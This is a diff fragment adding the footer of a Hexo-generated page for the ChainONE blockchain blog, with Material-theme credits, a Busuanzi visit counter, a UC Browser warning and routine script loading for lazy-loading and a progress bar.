+            Copyright&nbsp;©&nbsp;2017&nbsp;-<script type="text/javascript">var fd = new Date();document.write("&nbsp;" + fd.getFullYear() + "&nbsp;");</script>区块链技术指北 | ChainONE 官方博客
+            
+        </div>
+
+        <!-- Paradox Footer Right Section -->
+
+        <!--
+        I am glad you use this theme, the development is no so easy, I hope you can keep the copyright.
+        It will not impact the appearance and can give developers a lot of support :)
+
+        很高兴您使用该主题，开发不易，希望您可以保留一下版权声明。
+        它不会影响美观并可以给开发者很大的支持。 :)
+        -->
+
+        <div class="mdl-mini-footer--right-section">
+            <div>
+                <div class="footer-develop-div">Powered by <a href="https://hexo.io" target="_blank" class="footer-develop-a">Hexo</a></div>
+                <div class="footer-develop-div">Theme - <a href="https://github.com/viosey/hexo-theme-material" target="_blank" class="footer-develop-a">Material</a></div>
+            </div>
+        </div>
+    
+</footer>
+
+
+                    <!-- Import JS File -->
+
+    <script>lsloader.load("lazyload_js","/js/lazyload.min.js?1BcfzuNXqV+ntF6gq+5X3Q==", true)</script>
+
+
+
+    <script>lsloader.load("js_js","/js/js.min.js?d+XW6aNuIPgOn1iA7NnB4g==", true)</script>
+
+
+
+    <script>lsloader.load("np_js","/js/nprogress.js?pl3Qhb9lvqR1FlyLUna1Yw==", true)</script>
+
+
+<script type="text/ls-javascript" id="NProgress-script">
+    NProgress.configure({
+        showSpinner: true
+    });
+    NProgress.start();
+    $('#nprogress .bar').css({
+        'background': '#29d'
+    });
+    $('#nprogress .peg').css({
+        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
+    });
+    $('#nprogress .spinner-icon').css({
+        'border-top-color': '#29d',
+        'border-left-color': '#29d'
+    });
+    setTimeout(function() {
+        NProgress.done();
+        $('.fade').removeClass('out');
+    }, 800);
+</script>
+
+
+
+
+
+
+
+    <!-- Busuanzi -->
+    <script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+   <!-- GitTalk -->
+
+
+
+
+
+<!-- UC Browser Compatible -->
+<script>
+	var agent = navigator.userAgent.toLowerCase();
+	if(agent.indexOf('ucbrowser')>0) {
+		document.write('<link rel="stylesheet" href="/css/uc.css">');
+	   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
+	}
+</script>
+
+<!-- Import prettify js  -->
+
+
+    
+        <script>lsloader.load("hanabi","/js/hanabi-browser-bundle.js?Pki5+pzkluqu53g+ouMWpA==", true)</script>
+    
+
+
+<!-- Window Load -->
+<!-- add class for prettify -->
+<script type="text/ls-javascript" id="window-load">
+    $(window).on('load', function() {
+        // Post_Toc parent position fixed
+        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
+    });
+
+    
+    
+        
+        
+        HanabiBrowser.start('pre code',false);
+    
+</script>
+
+<!-- MathJax Load-->
+
+
+<!-- Bing Background -->
+
+
+<script type="text/ls-javascript" id="lazy-load">
+    // Offer LazyLoad
+    queue.offer(function(){
+        $('.lazy').lazyload({
+            effect : 'show'
+        });
+    });
+
+    // Start Queue
+    $(document).ready(function(){
+        setInterval(function(){
+            queue.execNext();
+        },200);
+    });
+</script>
+
+<!-- Custom Footer -->
+
+
+
+<script>
+    (function(){
+        var scriptList = document.querySelectorAll('script[type="text/ls-javascript"]')
+
+        for (var i = 0; i < scriptList.length; ++i) {
+            var item = scriptList[i];
+            lsloader.runInlineScript(item.id,item.id);
+        }
+    })()
+console.log('\n %c © Material Theme | Version: 1.5.2 | https://github.com/viosey/hexo-theme-material %c \n', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-left-radius:5px;border-bottom-left-radius:5px;', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-right-radius:5px;border-bottom-right-radius:5px;');
+</script>
+
+   
+                    <!-- Google Ad -->
+                </main>
+            </div>
+        </body>
+    
+</html>
